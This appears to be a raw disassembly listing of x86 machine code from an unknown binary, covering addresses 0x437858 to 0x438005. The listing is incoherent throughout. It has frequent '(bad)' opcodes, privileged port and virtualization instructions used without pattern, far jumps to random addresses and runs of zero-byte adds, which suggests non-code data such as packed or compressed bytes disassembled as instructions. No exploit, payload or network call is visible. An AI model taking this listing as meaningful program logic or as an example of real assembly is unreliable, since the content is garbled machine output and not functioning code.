  437858:	mov    BYTE PTR [ebp-0x21068011],dh
  43785e:	dec    ebx
  43785f:	push   ss
  437860:	mov    cl,0xf6
  437862:	inc    ebx
  437863:	push   ds
  437864:	cdq    
  437865:	xchg   DWORD PTR [eax],eax
  437867:	add    BYTE PTR [eax],al
  437869:	add    BYTE PTR [eax],al
  43786b:	mov    edi,0x6dd06e4e
  437870:	sbb    al,BYTE PTR [esi+0x13da7b55]
  437876:	jmp    0x71f7fdf1
  43787b:	bound  eax,QWORD PTR ds:0x93bce900
  437881:	add    dh,BYTE PTR [ecx]
  437883:	popf   
  437884:	jg     0x43787f
  437886:	add    BYTE PTR [ebx+0x5],bl
  437889:	cmp    DWORD PTR [ebx+0xb5bfb08],ecx
  43788f:	pushf  
  437890:	add    eax,DWORD PTR [ebx-0x4f7f2fab]
  437896:	adc    al,0xfb
  437898:	jg     0x43784a
  43789a:	sbb    al,0xcb
  43789c:	and    eax,0xc68ed333
  4378a1:	ins    BYTE PTR es:[edi],dx
  4378a2:	adc    edx,edi
  4378a4:	cmp    bh,ah
  4378a6:	mov    dl,al
  4378a8:	add    DWORD PTR [eax+0x14],ebx
  4378ab:	pop    esp
  4378ac:	add    esi,DWORD PTR [edx]
  4378ae:	pushf  
  4378af:	pop    edx
  4378b0:	sub    edx,DWORD PTR [eax+eax*1]
  4378b3:	dec    esp
  4378b4:	adc    eax,0x7af98b26
  4378b9:	xor    BYTE PTR [esp+ebp*4+0x1c00032f],0xfc
  4378c1:	(bad)  
  4378c2:	push   eax
  4378c3:	sub    BYTE PTR [ebx],al
  4378c5:	add    BYTE PTR [ebx-0x763efba3],cl
  4378cb:	leave  
  4378cc:	jp     0x437902
  4378ce:	retf   0x0
  4378d1:	add    BYTE PTR [eax],al
  4378d3:	add    dl,al
  4378d5:	add    BYTE PTR [ebx-0x7401afb3],0xb0
  4378dc:	xor    BYTE PTR [ecx+edi*8-0x1],bh
  4378e0:	xor    ch,BYTE PTR [ebx+eax*4]
  4378e3:	in     eax,0x21
  4378e5:	inc    esp
  4378e6:	adc    DWORD PTR [ebp+0x70],0xfffffffc
  4378ea:	inc    esp
  4378eb:	or     BYTE PTR [edx],dl
  4378ed:	(bad)  
  4378ee:	xchg   ebx,eax
  4378ef:	mov    al,dh
  4378f1:	jnp    0x4378ec
  4378f3:	jmp    edi
  4378f5:	sti    
  4378f6:	fcomp  QWORD PTR [ebp-0x71]
  4378f9:	(bad)  
  4378fa:	fwait
  4378fb:	mov    al,0x30
  4378fd:	jns    0x4378f8
  4378ff:	push   DWORD PTR [edx+0x29]
  437902:	and    ebp,0x75
  437905:	ss mov edi,0xc09cb1cc
  43790b:	int3   
  43790c:	test   eax,0xc1ccc0b4
  437911:	lods   al,BYTE PTR ds:[esi]
  437912:	ror    ah,0xb9
  437915:	sbb    eax,0xbcf6ec77
  43791a:	fadd   QWORD PTR [esp-0x737acf93]
  437921:	lock xor al,0x8
  437924:	cld    
  437925:	ds pushf 
  437927:	test   DWORD PTR [edx+eiz*8+0x1aeedc30],eax
  43792e:	or     BYTE PTR [edx-0x4],dl
  437931:	push   ss
  437932:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  437933:	test   DWORD PTR [ebx+eiz*2+0x8534],esp
  43793a:	add    BYTE PTR [eax],al
  43793c:	add    BYTE PTR [ebx+ebx*2-0x41133930],bh
  437943:	mov    eax,ds:0x773aea09
  437948:	(bad)  
  437949:	xor    al,0xca
  43794b:	repz add al,0x2f
  43794e:	jecxz  0x4379cb
  437950:	cmp    al,0x6e
  437952:	imul   edi,ebp,0xffffff86
  437955:	std    
  437956:	stos   DWORD PTR es:[edi],eax
  437957:	clc    
  437958:	dec    DWORD PTR [edx]
  43795a:	jecxz  0x4379d7
  43795c:	inc    esp
  43795d:	outs   dx,BYTE PTR ds:[esi]
  43795e:	imul   edi,ebp,0xffffff86
  437961:	in     eax,dx
  437962:	mov    bl,0xf8
  437964:	push   edx
  437966:	bnd jnp 0x4379b5
  437969:	jle    0x4379d6
  43796b:	std    
  43796c:	xchg   ch,ch
  43796e:	mov    ebx,0xf2dafff8
  437973:	jnp    0x4379c9
  437975:	jle    0x4379e2
  437977:	std    
  437978:	xchg   ch,bh
  43797a:	xchg   ebx,eax
  43797b:	clc    
  43797c:	inc    edx
  43797e:	loopne 0x4379fb
  437980:	push   esp
  437981:	popa   
  437982:	add    ah,bh
  437984:	add    edi,eax
  437986:	xchg   esi,eax
  437987:	outs   dx,DWORD PTR ds:[esi]
  437988:	das    
  437989:	jo     0x43798d
  43798b:	out    0xd0,eax
  43798d:	mov    ebx,0xe83f5fe4
  437992:	add    BYTE PTR [esi+0x7b],ch
  437995:	sub    DWORD PTR [esi],edx
  437997:	out    0x3,eax
  437999:	pop    eax
  43799a:	je     0x4379c4
  43799c:	jnp    0x4379bc
  43799e:	pop    edx
  43799f:	pusha  
  4379a0:	push   cs
  4379a1:	add    BYTE PTR [eax],al
  4379a3:	add    BYTE PTR [eax],al
  4379a5:	add    BYTE PTR [ecx-0x75],bh
  4379a8:	sbb    al,0x8c
  4379aa:	bnd jnp 0x437989
  4379ad:	add    DWORD PTR [ebp+0x2],esi
  4379b0:	loop   0x437a30
  4379b2:	retf   
  4379b3:	add    esp,edi
  4379b5:	add    ebp,esi
  4379b7:	xchg   ebp,eax
  4379b8:	outs   dx,DWORD PTR ds:[esi]
  4379b9:	das    
  4379ba:	js     0x4379be
  4379bc:	out    0x7a,eax
  4379be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4379bf:	jbe    0x4379ee
  4379c1:	into   
  4379c2:	inc    eax
  4379c3:	jge    0x4379ac
  4379c5:	fsubr  DWORD PTR [ebx]
  4379c7:	add    DWORD PTR ds:0x706ec67a,ebp
  4379cd:	ds and eax,0x293e5e92
  4379d3:	mov    eax,edi
  4379d5:	cld    
  4379d6:	in     eax,0xcd
  4379d8:	push   ebp
  4379d9:	add    DWORD PTR [ebp+esi*4-0x55],edi
  4379dd:	js     0x4379ea
  4379df:	ret    0xbced
  4379e2:	jg     0x4379e8
  4379e4:	mov    eax,ds:0x9c8b2c78
  4379e9:	mov    edx,DWORD PTR [edi-0x75]
  4379ec:	stos   DWORD PTR es:[edi],eax
  4379ed:	jo     0x4379da
  4379ef:	aaa    
  4379f0:	mov    esp,0x5dc55c9b
  4379f5:	push   cs
  4379f6:	shl    ebx,1
  4379f8:	add    DWORD PTR [edi+0x3ee3e3d],eax
  4379fe:	jne    0x437a31
  437a00:	add    bh,bh
  437a02:	mov    edx,0x3de37c51
  437a07:	ins    BYTE PTR es:[edi],dx
  437a08:	and    eax,0xde
  437a0d:	add    BYTE PTR [eax],al
  437a0f:	xor    bh,cl
  437a11:	fbstp  TBYTE PTR [edx-0x3b]
  437a14:	mov    cl,0x9
  437a16:	sahf   
  437a17:	lods   eax,DWORD PTR ds:[esi]
  437a18:	(bad)  
  437a19:	std    
  437a1a:	sahf   
  437a1b:	sahf   
  437a1c:	test   eax,0xaa0ee8c9
  437a21:	adc    ch,cl
  437a23:	jbe    0x4379ac
  437a25:	dec    ebx
  437a26:	xchg   ebp,eax
  437a27:	hlt    
  437a28:	inc    esp
  437a29:	je     0x437a04
  437a2b:	jg     0x4379de
  437a2d:	push   esp
  437a2e:	js     0x437aab
  437a30:	jge    0x437a05
  437a32:	out    dx,al
  437a33:	iret   
  437a34:	push   ecx
  437a35:	(bad)  
  437a36:	js     0x4379f5
  437a38:	adc    BYTE PTR [eax],al
  437a3a:	jmp    0x733f721a
  437a3f:	fs jp  0x437abf
  437a42:	and    al,0xe5
  437a44:	push   es
  437a45:	stc    
  437a46:	and    al,0xdd
  437a48:	out    dx,eax
  437a49:	mov    esp,DWORD PTR [edi+eiz*8+0x9]
  437a4d:	test   BYTE PTR ds:0x6c000279,ch
  437a53:	mov    ebp,0x76e23bfa
  437a58:	add    al,BYTE PTR [ebp+0x61c3f29c]
  437a5e:	push   0xffffffbd
  437a60:	retf   0xf23b
  437a63:	jbe    0x437a67
  437a65:	add    BYTE PTR [ebp+eax*4-0x36],ah
  437a69:	cmp    esp,edx
  437a6b:	jbe    0x437a6f
  437a6d:	jae    0x437a67
  437a6f:	ins    DWORD PTR es:[edi],dx
  437a70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  437a71:	and    al,0xe9
  437a73:	add    BYTE PTR [eax],al
  437a75:	add    BYTE PTR [eax],al
  437a77:	add    BYTE PTR [esi+0x2],dh
  437a7a:	add    BYTE PTR [edx+0x3],ch
  437a7d:	jge    0x437ac7
  437a7f:	xchg   ebx,esi
  437a81:	xor    al,0x0
  437a83:	add    BYTE PTR [eax-0x6f],dl
  437a86:	pop    esi
  437a87:	adc    DWORD PTR [eax+0x3e],0x36
  437a8b:	or     ecx,esp
  437a8d:	(bad)  
  437a8e:	stc    
  437a8f:	mov    ecx,0x88cb
  437a94:	inc    edx
  437a95:	add    eax,0x7b884894
  437a9a:	stc    
  437a9b:	call   DWORD PTR [edi]
  437a9d:	mov    ebp,0x84bb015e
  437aa2:	out    0x2,al
  437aa4:	and    DWORD PTR [ecx+0x3207b777],edx
  437aaa:	cld    
  437aab:	test   esi,ebx
  437aad:	or     esp,DWORD PTR [ebp-0x77]
  437ab0:	dec    ecx
  437ab1:	call   0xf474:0xfe5bb707
  437ab8:	ror    DWORD PTR [eax+0x3ad75474],1
  437abe:	lock (bad) 
  437ac0:	shl    bh,0x5b
  437ac3:	or     ebx,DWORD PTR [edi+edi*8-0x7c]
  437ac7:	fwait
  437ac8:	pop    esp
  437ac9:	(bad)  
  437aca:	(bad)  
  437acb:	call   edi
  437acd:	cmp    esp,edi
  437acf:	call   FWORD PTR [ecx-0x6a]
  437ad2:	jnp    0x437ac2
  437ad4:	and    dh,bh
  437ad6:	ins    BYTE PTR es:[edi],dx
  437ad7:	loopne 0x437b30
  437ad9:	cmp    eax,ebp
  437adb:	jg     0x437add
  437add:	add    BYTE PTR [eax],al
  437adf:	add    BYTE PTR [eax],al
  437ae1:	jnp    0x437b5a
  437ae3:	mov    al,0x7c
  437ae5:	xchg   edi,eax
  437ae6:	add    eax,0x5877485
  437aeb:	xor    edi,edx
  437aed:	shr    BYTE PTR [ebp-0x7c],0xda
  437af1:	ja     0x437a9a
  437af3:	cmp    ebx,0xffffff97
  437af6:	sub    bl,al
  437af8:	rcpps  xmm6,XMMWORD PTR [ebx-0x7c]
  437afc:	(bad)  
  437afe:	mov    ?,ecx
  437b00:	mov    bh,0x75
  437b02:	shr    esi,0xff
  437b05:	fiadd  DWORD PTR [edx-0x4a2ded84]
  437b0b:	mov    DWORD PTR [ebp+0x737b7548],eax
  437b11:	aad    0xed
  437b13:	test   DWORD PTR [ebx-0x7],esi
  437b16:	fild   WORD PTR [edi]
  437b18:	in     al,dx
  437b19:	not    BYTE PTR [ebx+0x2]
  437b1c:	inc    esi
  437b1d:	cld    
  437b1e:	fst    QWORD PTR [edi+0x26340b73]
  437b24:	push   ebp
  437b25:	out    dx,al
  437b26:	inc    ebp
  437b27:	and    DWORD PTR [ebp-0x33474b3f],edi
  437b2d:	mov    ecx,0xb1ccb8ac
  437b32:	sbb    eax,0xbcf6ec7b
  437b37:	hlt    
  437b38:	dec    esp
  437b39:	retf   
  437b3a:	cmp    BYTE PTR [ebx-0x9],bh
  437b3d:	inc    BYTE PTR [ebx-0x9]
  437b40:	mov    al,0xba
  437b42:	ins    DWORD PTR es:[edi],dx
  437b43:	aam    0xcd
  437b45:	add    BYTE PTR [eax],al
  437b47:	add    BYTE PTR [eax],al
  437b49:	add    BYTE PTR [edx],dh
  437b4b:	pop    ds
  437b4c:	mov    ecx,?
  437b4e:	push   edx
  437b4f:	add    DWORD PTR [edi+0x70fbb087],0x11de7a46
  437b59:	add    al,0xf0
  437b5b:	stos   DWORD PTR es:[edi],eax
  437b5c:	or     DWORD PTR [eax],ecx
  437b5e:	in     al,dx
  437b5f:	cmc    
  437b60:	add    eax,DWORD PTR [eax]
  437b62:	jne    0x437b4a
  437b64:	adc    edi,ebp
  437b66:	jmp    0x7641:0x750086d0
  437b6d:	inc    esp
  437b6e:	repnz imul edi,DWORD PTR [edx-0x2b],0x73f37a
  437b76:	jne    0x437be3
  437b78:	test   cl,al
  437b7a:	jae    0x437b28
  437b7c:	jbe    0x437bf9
  437b7e:	icebp  
  437b7f:	add    ch,BYTE PTR [esi+0x7]
  437b82:	jge    0x437b0f
  437b84:	mov    esp,0x16d7f88f
  437b89:	jge    0x437ba3
  437b8b:	mov    gs,WORD PTR [edi+eax*4+0x45deb17c]
  437b92:	adc    BYTE PTR [ebx+0x7c],0xff
  437b96:	mov    DWORD PTR [ebp+0x7b],eax
  437b99:	and    DWORD PTR [eax+0x14fd6c50],eax
  437b9f:	add    edi,DWORD PTR [ebx-0x80]
  437ba2:	sub    DWORD PTR [edi+eiz*8],ecx
  437ba5:	add    ebx,DWORD PTR [eax+0x21c36c29]
  437bab:	adc    BYTE PTR [esi],cl
  437bad:	aas    
  437bae:	add    BYTE PTR [eax],al
  437bb0:	add    BYTE PTR [eax],al
  437bb2:	add    BYTE PTR [ebp-0x73de1112],cl
  437bb8:	jle    0x437c1c
  437bba:	pop    es
  437bbb:	jnp    0x437bbf
  437bbd:	out    0x21,eax
  437bbf:	jl     0x437b42
  437bc1:	imul   edi,ebp,0x72
  437bc4:	jns    0x437b54
  437bc6:	out    dx,al
  437bc7:	jmp    0x7a4c6948
  437bcc:	loopne 0x437b5f
  437bce:	xor    BYTE PTR ds:0x5803e70c,0x1
  437bd5:	or     DWORD PTR [ecx+0x3ed3df4],ecx
  437bdb:	jne    0x437c12
  437bdd:	xchg   ebp,eax
  437bde:	jp     0x437b96
  437be0:	jp     0x437c46
  437be2:	lods   al,BYTE PTR ds:[esi]
  437be3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  437be4:	or     al,0xa0
  437be6:	jge    0x437c5d
  437be8:	add    ah,bh
  437bea:	jbe    0x437b7f
  437bec:	add    eax,0x4561f13e
  437bf1:	aam    0xfd
  437bf3:	retf   
  437bf4:	jmp    esi
  437bf6:	add    esi,DWORD PTR [ebp-0x79]
  437bf9:	mov    eax,0xa1886
  437bfe:	jo     0x437c75
  437c00:	add    al,BYTE PTR [eax]
  437c02:	jmp    0x6b3e6572
  437c07:	stos   DWORD PTR es:[edi],eax
  437c08:	jbe    0x437c0e
  437c0a:	push   ds
  437c0b:	stos   DWORD PTR es:[edi],eax
  437c0c:	outs   dx,BYTE PTR ds:[esi]
  437c0d:	jae    0x437c78
  437c0f:	(bad)  
  437c10:	fcom   QWORD PTR [edx+eiz*2-0xd]
  437c14:	fdivr  QWORD PTR [ebp+esi*1+0x0]
  437c1b:	add    BYTE PTR [edx],al
  437c1d:	inc    esi
  437c1e:	int3   
  437c1f:	sub    eax,0x9ccc460a
  437c24:	cmp    DWORD PTR [esi+0x7d],esp
  437c27:	std    
  437c28:	fwait
  437c29:	lds    edx,FWORD PTR [ecx+0x72]
  437c2c:	pop    es
  437c2d:	or     esi,DWORD PTR [ecx-0x31d888c1]
  437c33:	ds push ds
  437c35:	jno    0x437bf8
  437c37:	and    al,0xed
  437c39:	jp     0x437c34
  437c3b:	(bad)  
  437c3c:	repnz sbb BYTE PTR [ebx-0x4b],0xfc
  437c41:	mov    edi,0x7a34ae00
  437c46:	add    al,0xe9
  437c48:	jbe    0x437c4c
  437c4a:	add    edx,0xffffff84
  437c4d:	push   es
  437c4e:	mov    bh,0x73
  437c50:	jns    0x437c54
  437c52:	add    BYTE PTR [esi-0x1702854c],ch
  437c58:	jbe    0x437c5c
  437c5a:	add    DWORD PTR [esi-0x1bcc7fbe],0x76
  437c61:	add    bh,BYTE PTR [ebp-0x51]
  437c64:	cmp    eax,ebx
  437c66:	xchg   ah,dh
  437c68:	push   es
  437c69:	cmp    BYTE PTR [ebx+0x51],0xbe
  437c6d:	ja     0x437c68
  437c6f:	jmp    0x633cf9ea
  437c74:	ins    BYTE PTR es:[edi],dx
  437c75:	jb     0x437c80
  437c77:	xchg   esi,eax
  437c78:	cmp    bh,BYTE PTR [edi+0x73]
  437c7b:	add    BYTE PTR [eax+0x3],cl
  437c7e:	retf   
  437c7f:	mov    DWORD PTR [eax],eax
  437c81:	add    BYTE PTR [eax],al
  437c83:	add    BYTE PTR [eax],al
  437c85:	leave  
  437c86:	xchg   edi,eax
  437c87:	cmp    DWORD PTR [ebp+0x38],0xe7fc4cf5
  437c8e:	scas   al,BYTE PTR es:[edi]
  437c8f:	jne    0x437c99
  437c91:	xlat   BYTE PTR ds:[ebx]
  437c92:	mov    BYTE PTR [edi],al
  437c94:	test   BYTE PTR [ebx-0x38fffffe],cl
  437c9a:	xor    bh,al
  437c9c:	rdtsc  
  437c9e:	loope  0x437c9f
  437ca0:	(bad)  
  437ca1:	fdiv   st(2),st
  437ca3:	mov    ds:0x3cc24,eax
  437ca8:	add    bl,dl
  437caa:	enter  0xb0bb,0x22
  437cae:	jns    0x437ca9
  437cb0:	jmp    DWORD PTR [edi]
  437cb2:	sti    
  437cb3:	mov    ebx,0xb2038c16
  437cb8:	adc    BYTE PTR [ebx+eax*1+0x4ccb2b00],cl
  437cbf:	ret    
  437cc0:	jle    0x437d13
  437cc2:	outs   dx,DWORD PTR ds:[esi]
  437cc3:	mov    al,0xb4
  437cc5:	cld    
  437cc6:	inc    BYTE PTR [ecx]
  437cc8:	add    BYTE PTR [ebp+edx*1-0x4c45297d],cl
  437ccf:	fimul  DWORD PTR [ebx+0x95f76a4]
  437cd5:	fmul   st(3),st
  437cd7:	or     eax,0xaf704c00
  437cdc:	cwde   
  437cdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  437cde:	gs stc 
  437ce0:	inc    edi
  437ce2:	xor    edx,DWORD PTR [eax+ecx*4]
  437ce5:	and    BYTE PTR [esi-0x8],ch
  437ce8:	inc    eax
  437ce9:	add    BYTE PTR [eax],al
  437ceb:	add    BYTE PTR [eax],al
  437ced:	add    BYTE PTR [eax],bl
  437cef:	jo     0x437ca0
  437cf1:	cwde   
  437cf2:	gs gs stc 
  437cf5:	jmp    DWORD PTR [edi-0x2374ebc5]
  437cfb:	jp     0x437c7e
  437cfd:	sbb    al,0x75
  437cff:	jp     0x437d77
  437d01:	nop
  437d02:	shr    DWORD PTR [esi-0x3],1
  437d05:	inc    esp
  437d07:	pop    eax
  437d08:	inc    esi
  437d09:	inc    DWORD PTR [edx]
  437d0b:	imul   edi,ebp,0xd755a2fe
  437d11:	lds    ebx,FWORD PTR [ebx+0x1c]
  437d14:	xchg   ebx,eax
  437d15:	mov    edi,DWORD PTR [ecx]
  437d17:	arpl   WORD PTR [ebp+0x44d8ec62],cx
  437d1d:	adc    dh,BYTE PTR [ebp+0x69]
  437d20:	jbe    0x437d95
  437d22:	fld    DWORD PTR [ebx]
  437d24:	jmp    0x4d187b8a
  437d29:	jl     0x437d9a
  437d2b:	imul   edi,ebp,0x1b0aa661
  437d31:	pop    es
  437d32:	add    eax,0xaaffeb31
  437d37:	imul   esi,DWORD PTR [edi+eiz*1-0x778aaac0],0xffffffd9
  437d3f:	jbe    0x437d3e
  437d41:	inc    DWORD PTR [edx-0x7506e522]
  437d47:	aas    
  437d48:	xchg   ebp,eax
  437d49:	vmwrite ebp,DWORD PTR [ecx-0x3]
  437d4d:	add    BYTE PTR [ebx+0xc5795f],0x0
  437d54:	add    BYTE PTR [eax],al
  437d56:	add    BYTE PTR [ebx+ebp*2-0x3],dh
  437d5a:	xor    al,0xe0
  437d5c:	(bad)  
  437d5d:	repz or DWORD PTR [edi],0x6c
  437d61:	std    
  437d62:	jmp    FWORD PTR [edx-0x2c]
  437d65:	ja     0x437d17
  437d67:	shl    DWORD PTR [ecx-0x3],cl
  437d6a:	dec    DWORD PTR [edx]
  437d6c:	pop    esp
  437d6d:	std    
  437d6e:	push   DWORD PTR [ebp+0x50]
  437d71:	xchg   BYTE PTR [edi-0x77890c58],al
  437d77:	icebp  
  437d78:	dec    ebp
  437d79:	std    
  437d7a:	jmp    FWORD PTR [esi+0x2]
  437d7d:	xor    al,BYTE PTR [esi]
  437d7f:	lea    eax,ds:0xf6e57092
  437d85:	fadd   QWORD PTR [ebx]
  437d87:	jne    0x437d14
  437d89:	mov    ah,0x97
  437d8b:	xchg   edi,eax
  437d8c:	push   ecx
  437d8d:	inc    ebp
  437d8e:	jns    0x437d3d
  437d90:	or     dh,BYTE PTR [eax+0x3f]
  437d93:	adc    ebp,ebx
  437d95:	fbstp  TBYTE PTR [ebx+0x2d]
  437d98:	or     eax,0xd2f003e7
  437d9d:	cli    
  437d9e:	jns    0x437d95
  437da0:	mov    edx,0x8a7503f1
  437da5:	jmp    0x437d99
  437da7:	stc    
  437da8:	mov    edi,0xe2d0302
  437dad:	outs   dx,BYTE PTR ds:[esi]
  437dae:	or     al,0x69
  437db0:	mov    DWORD PTR [edi+0x3092f0fb],ebp
  437db6:	out    dx,al
  437db7:	mov    dl,0x75
  437db9:	pop    edi
  437dba:	lock add BYTE PTR [eax],al
  437dbd:	add    BYTE PTR [eax],al
  437dbf:	add    BYTE PTR [ebp-0x77],bh
  437dc2:	ja     0x437e0b
  437dc4:	xchg   DWORD PTR [edx],eax
  437dc6:	out    0x78,eax
  437dc8:	push   ds
  437dc9:	callw  0xe6f8
  437dcd:	mov    bl,0xf7
  437dcf:	fnstenv [eax-0x76b6a24]
  437dd5:	(bad)  
  437dd6:	mov    esi,0xb7082176
  437ddb:	jp     0x437de2
  437ddd:	mov    dh,0xd1
  437ddf:	add    esi,DWORD PTR [ebp-0x77]
  437de2:	cmp    al,0x88
  437de4:	xlat   BYTE PTR ds:[ebx]
  437de5:	mov    ebx,DWORD PTR [edi+0x4b]
  437de8:	xchg   DWORD PTR [edx],eax
  437dea:	out    0x98,eax
  437dec:	jb     0x437dca
  437dee:	pop    ebp
  437def:	inc    edi
  437df0:	add    eax,0x7503ecf6
  437df5:	fcom   QWORD PTR [ebp+0x89f09c]
  437dfb:	xor    eax,0x7f97520
  437e00:	lods   eax,DWORD PTR cs:[esi]
  437e02:	mov    eax,0xfd0276ff
  437e07:	stos   DWORD PTR es:[edi],eax
  437e08:	out    dx,al
  437e09:	jl     0x437d93
  437e0b:	xchg   ebp,eax
  437e0c:	and    BYTE PTR [ebp-0x7],dh
  437e0f:	add    al,ah
  437e11:	jl     0x437e66
  437e13:	inc    ebp
  437e14:	or     DWORD PTR [edx+0x74fc7f88],esi
  437e1a:	stc    
  437e1b:	jbe    0x437e03
  437e1d:	je     0x437e18
  437e1f:	jmp    0xb4cae9f1
  437e24:	add    BYTE PTR [eax],al
  437e26:	add    BYTE PTR [eax],al
  437e28:	add    dh,ch
  437e2a:	jle    0x437db4
  437e2c:	pop    ebp
  437e2d:	enter  0xf974,0xd2
  437e31:	or     eax,edi
  437e33:	pusha  
  437e34:	fidivr WORD PTR [ecx]
  437e36:	xchg   edx,eax
  437e37:	mov    esp,0x870276f3
  437e3c:	xchg   esp,eax
  437e3d:	loop   0x437e1e
  437e3f:	int3   
  437e40:	or     ebp,DWORD PTR ds:0x6b6007ca
  437e46:	pop    esi
  437e47:	(bad)  
  437e48:	lock push es
  437e4a:	mov    edx,0x7f76e912
  437e4f:	push   eax
  437e50:	std    
  437e51:	add    BYTE PTR [edx+0x276f7b8],al
  437e57:	mov    ch,ch
  437e59:	imul   edi,DWORD PTR [edi+0x43],0x13da70c5
  437e60:	bound  esi,QWORD PTR [ecx+0x10]
  437e63:	test   DWORD PTR [ecx],esp
  437e65:	jns    0x437ee3
  437e67:	nop
  437e68:	pusha  
  437e69:	jg     0x437e6d
  437e6b:	add    BYTE PTR [ecx+0x7d],dh
  437e6e:	or     DWORD PTR [ebp+0x113579],eax
  437e74:	jmp    0x12f7674
  437e79:	dec    ebp
  437e7a:	pop    eax
  437e7b:	or     eax,0xc2261cb1
  437e80:	(bad)  
  437e83:	or     BYTE PTR [ebp-0x5c],0x91
  437e87:	push   esp
  437e88:	or     bh,BYTE PTR [ebp+eax*4+0xbc90]
  437e8f:	add    BYTE PTR [eax],al
  437e91:	add    BYTE PTR [edx],ah
  437e93:	add    BYTE PTR [eax],al
  437e95:	mov    edx,ecx
  437e97:	repz pop ebp
  437e99:	mov    esp,esp
  437e9b:	mov    dh,0xe
  437e9d:	add    BYTE PTR [eiz*8-0x497899ef],cl
  437ea4:	mov    esp,0x5dffdc0a
  437ea9:	shl    DWORD PTR [ebx],cl
  437eab:	push   0x1854b802
  437eb0:	add    BYTE PTR [eax],al
  437eb2:	iret   
  437eb3:	push   edx
  437eb4:	icebp  
  437eb5:	mov    DWORD PTR [edx+eax*2+0xe],edx
  437eb9:	add    ah,bl
  437ebb:	test   BYTE PTR [eax-0x5d44],cl
  437ec1:	or     BYTE PTR [esi-0x6506847f],0x1
  437ec8:	pop    esp
  437ec9:	mov    DWORD PTR [ecx],eax
  437ecb:	in     al,0x5d
  437ecd:	shr    DWORD PTR [esi+0x25084884],cl
  437ed3:	dec    edx
  437ed4:	frstor [esi-0x6b]
  437ed7:	(bad)  
  437ed8:	mov    eax,0x82ff9c16
  437edd:	push   eax
  437ede:	mov    al,ds:0xa2b88085
  437ee3:	(bad)  
  437ee4:	inc    DWORD PTR [edi+0x45830e60]
  437eea:	xor    dh,bh
  437eec:	push   edi
  437eed:	adc    al,0xe7
  437eef:	ja     0x437efe
  437ef1:	mov    bl,ah
  437ef3:	mov    dh,0xe
  437ef5:	add    BYTE PTR [eax],al
  437ef7:	add    BYTE PTR [eax],al
  437ef9:	add    BYTE PTR [eax],al
  437efb:	jne    0x437f66
  437efd:	mov    cl,BYTE PTR [eax+0x7d]
  437f00:	loope  0x437f12
  437f02:	or     esi,ebp
  437f04:	fdivr  DWORD PTR [eax-0x75968aee]
  437f0a:	jnp    0x437f2d
  437f0c:	push   0xffffffd5
  437f0e:	adc    esp,esp
  437f10:	pop    eax
  437f11:	sub    eax,esi
  437f13:	fwait
  437f14:	cmp    BYTE PTR [esi+0x7d],ch
  437f17:	aaa    
  437f18:	xlat   BYTE PTR ds:[ebx]
  437f19:	mov    edx,DWORD PTR [eax-0x28d2f]
  437f1f:	xchg   ebx,eax
  437f20:	loop   0x437ed6
  437f22:	mov    eax,0xe6fd696b
  437f27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  437f28:	addr16 std 
  437f2a:	call   FWORD PTR [ebx+0x18]
  437f2d:	arpl   WORD PTR [edx+0x7c],sp
  437f30:	fnstenv [edx+edx*1-0x407d968b]
  437f37:	ja     0x437f4b
  437f39:	xor    eax,0xbe68d2fe
  437f3e:	adc    BYTE PTR [ebp+0x69],dh
  437f41:	std    
  437f42:	jl     0x437f03
  437f44:	outs   dx,BYTE PTR ds:[esi]
  437f45:	push   cs
  437f46:	mov    DWORD PTR [edx+ebp*2-0x3],ebx
  437f4a:	inc    DWORD PTR [edx+0x7fbe8534]
  437f50:	imul   edi,ebp,0xc8f19c24
  437f56:	imul   esi
  437f58:	lock mov edi,0x3c697512
  437f5e:	leave  
  437f5f:	add    BYTE PTR [eax],al
  437f61:	add    BYTE PTR [eax],al
  437f63:	add    BYTE PTR [ebx],cl
  437f65:	mov    esp,0xa8e5b10e
  437f6a:	or     al,BYTE PTR [eax]
  437f6c:	jne    0x437f60
  437f6e:	shr    bl,1
  437f70:	fisttp DWORD PTR [edx+eiz*2-0x799c427b]
  437f77:	inc    ebx
  437f78:	pop    ecx
  437f79:	add    ecx,DWORD PTR [ecx]
  437f7b:	or     eax,DWORD PTR ds:0x7503f1ab
  437f81:	jge    0x437fba
  437f83:	sbb    bl,dh
  437f85:	or     BYTE PTR [edi+0x1a],0x75
  437f89:	add    ch,BYTE PTR [edi+0x8]
  437f8c:	push   0x7d
  437f8e:	and    al,0x68
  437f90:	xor    bl,dl
  437f92:	fimul  DWORD PTR [ebp+ebp*4+0x7acc5e16]
  437f99:	jl     0x438012
  437f9b:	mov    ebx,0x8be70287
  437fa0:	imul   eax,DWORD PTR [ecx],0x18c9945e
  437fa6:	out    0x3,eax
  437fa8:	clc    
  437fa9:	out    dx,eax
  437faa:	push   edx
  437fab:	add    ebx,DWORD PTR [ebp-0x64eb87ea]
  437fb1:	cmp    al,0xc9
  437fb3:	push   esp
  437fb4:	fdivr  QWORD PTR [ebp-0x64]
  437fb7:	jnp    0x437fa7
  437fb9:	(bad)  
  437fba:	in     al,dx
  437fbb:	jae    0x437faf
  437fbd:	xchg   edx,eax
  437fbe:	pop    ebx
  437fbf:	sbb    dh,BYTE PTR [ebp+0x2]
  437fc2:	pop    esi
  437fc3:	xlat   BYTE PTR ds:[ebx]
  437fc4:	into   
  437fc5:	call   0x443c29
  437fca:	add    BYTE PTR [eax],al
  437fcc:	add    ch,bh
  437fce:	sbb    bh,ah
  437fd0:	add    edx,eax
  437fd2:	and    al,BYTE PTR [ecx-0x22bd1274]
  437fd8:	add    esi,DWORD PTR [ebp-0x18]
  437fdb:	adc    eax,0xa37af869
  437fe0:	sbb    DWORD PTR [ebp+0x2],esi
  437fe3:	inc    ecx
  437fe4:	or     ecx,ebp
  437fe6:	stos   BYTE PTR es:[edi],al
  437fe7:	stc    
  437fe8:	add    esi,DWORD PTR [ebp+0x5]
  437feb:	sbb    al,0x7c
  437fed:	cli    
  437fee:	jp     0x437f73
  437ff0:	sbb    DWORD PTR [ebp+0x2],esi
  437ff3:	outs   dx,BYTE PTR ds:[esi]
  437ff4:	mov    esi,DWORD PTR [ecx]
  437ff6:	sbb    BYTE PTR [eax],al
  437ff8:	jmp    0xad016f73
  437ffd:	stc    
  437ffe:	js     0x43800b
  438000:	daa    
  438001:	push   ebp
  438002:	mov    BYTE PTR [ebx-0x73],dl
  438005:	pop    esp
